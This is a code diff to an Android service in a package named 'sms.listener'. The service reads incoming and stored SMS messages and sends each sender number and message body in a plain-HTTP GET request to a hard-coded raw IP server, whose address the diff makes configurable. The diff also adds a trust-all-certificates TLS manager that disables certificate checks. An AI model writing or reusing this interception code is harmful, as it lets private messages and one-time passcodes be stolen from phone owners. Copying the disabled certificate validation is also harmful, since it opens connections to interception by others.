@@ -21,19 +21,32 @@ import android.text.TextUtils;
 import android.util.Log;
 
 import com.sms.listener.IOnLiveService;
+import com.sms.listener.biz.db.Config;
 import com.sms.listener.observer.SmsObserver;
 import com.sms.listener.po.SmsMessage;
 import com.sms.listener.receiver.SmsReceiver;
 import com.sms.listener.utils.HttpUtils;
 
 import java.io.IOException;
+import java.security.SecureRandom;
+import java.security.cert.CertificateException;
+import java.security.cert.X509Certificate;
 import java.util.ArrayList;
+import java.util.Iterator;
 import java.util.List;
+import java.util.Map;
 
+import javax.net.ssl.SSLContext;
+import javax.net.ssl.SSLSocketFactory;
+import javax.net.ssl.TrustManager;
+import javax.net.ssl.X509TrustManager;
+
+import io.realm.Realm;
 import okhttp3.Call;
 import okhttp3.Callback;
 import okhttp3.OkHttpClient;
 import okhttp3.Request;
+import okhttp3.RequestBody;
 import okhttp3.Response;
 
 /**
@@ -43,7 +56,7 @@ import okhttp3.Response;
 public class BaseService extends Service {
 
     public static final int NEW_MSG_WHAT = 10000;
-    private static final String URL = "http://101.132.97.20:8099/getMessage/";
+    private static final String DEFAULT_URL = "http://101.132.97.20:8099/getMessage/";
     private static final int RE_TRY_COUNT = 3;
     private Uri SMS_INBOX = Uri.parse("content://sms/inbox");
     private Uri SMS_ALL = Uri.parse("content://sms");
@@ -51,11 +64,14 @@ public class BaseService extends Service {
     private LocalService localService;
     private SmsObserver smsObserver;
     private int reTryCount = 0;
+    private String url;
+    private String localPhone;
 
     @Override
     public void onCreate() {
         super.onCreate();
         init();
+        initData();
     }
 
     private void init() {
@@ -65,6 +81,18 @@ public class BaseService extends Service {
         localService = new LocalService();
         smsObserver = new SmsObserver(smsHandler);
         getContentResolver().registerContentObserver(SMS_ALL, true, smsObserver);
+    }
+
+    private void initData() {
+        Realm realm = Realm.getDefaultInstance();
+        Config config = realm.where(Config.class).findFirst();
+        if(null != config) {
+            url = config.getUrl();
+            localPhone = config.getLocalPhone();
+        }
+        if(null == url || url.length() < 1) {
+            url = DEFAULT_URL;
+        }
     }
 
     private Handler smsHandler = new Handler() {
@@ -82,7 +110,7 @@ public class BaseService extends Service {
                         for (int i = 0; i < len; i++) {
                             smsMessage = smsList.get(i);
                             content = smsMessage.getSmsPhone() + "-" + smsMessage.getSmsBody();
-                            getRequest(URL + content);
+                            getRequest(url + content);
                         }
                     }
                 }).start();
@@ -175,6 +203,93 @@ public class BaseService extends Service {
             }
         });
     }
+
+    /**
+     * post请求，异步方式，提交数据，是在子线程中执行的，需要切换到主线程才能更新UI
+     * @param url
+     * @param bodyParams
+     */
+    public  void postRequest(String url, Map<String,String> bodyParams) {
+        //1.okhttpClient对象
+        OkHttpClient okHttpClient = new OkHttpClient();
+        //1构造RequestBody
+        RequestBody body=setRequestBody(bodyParams);
+        //2 构造Request
+        Request.Builder requestBuilder = new Request.Builder();
+        Request request = requestBuilder.post(body).url(url).build();
+        //3 将Request封装为Call
+        Call call = okHttpClient.newCall(request);
+        //4 执行Call
+        call.enqueue(new Callback() {
+            @Override
+            public void onFailure(Call call, IOException e) {
+
+            }
+
+            @Override
+            public void onResponse(Call call, Response response) throws IOException {
+
+            }
+        });
+    }
+
+    /**
+     * post的请求参数，构造RequestBody
+     * @param bodyParams
+     * @return
+     */
+    private RequestBody setRequestBody(Map<String, String> bodyParams){
+        RequestBody body;
+        okhttp3.FormBody.Builder formEncodingBuilder=new okhttp3.FormBody.Builder();
+        if(null != bodyParams){
+            Iterator<String> iterator = bodyParams.keySet().iterator();
+            String key;
+            while (iterator.hasNext()) {
+                key = iterator.next().toString();
+                formEncodingBuilder.add(key, bodyParams.get(key));
+            }
+        }
+        body=formEncodingBuilder.build();
+        return body;
+
+    }
+
+
+    /**
+     * 生成安全套接字工厂，用于https请求的证书跳过
+     * @return
+     */
+    public SSLSocketFactory createSSLSocketFactory() {
+        SSLSocketFactory ssfFactory = null;
+        try {
+            SSLContext sc = SSLContext.getInstance("TLS");
+            sc.init(null, new TrustManager[]{new TrustAllCerts()}, new SecureRandom());
+            ssfFactory = sc.getSocketFactory();
+        } catch (Exception e) {
+        }
+        return ssfFactory;
+    }
+
+    /**
+     * 用于信任所有证书
+     */
+    class TrustAllCerts implements X509TrustManager {
+        @Override
+        public void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {
+        }
+
+        @Override
+        public void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {
+
+        }
+
+        @Override
+        public X509Certificate[] getAcceptedIssuers() {
+            return new X509Certificate[0];
+        }
+
+    }
+
 
     class LocalService extends IOnLiveService.Stub {
 
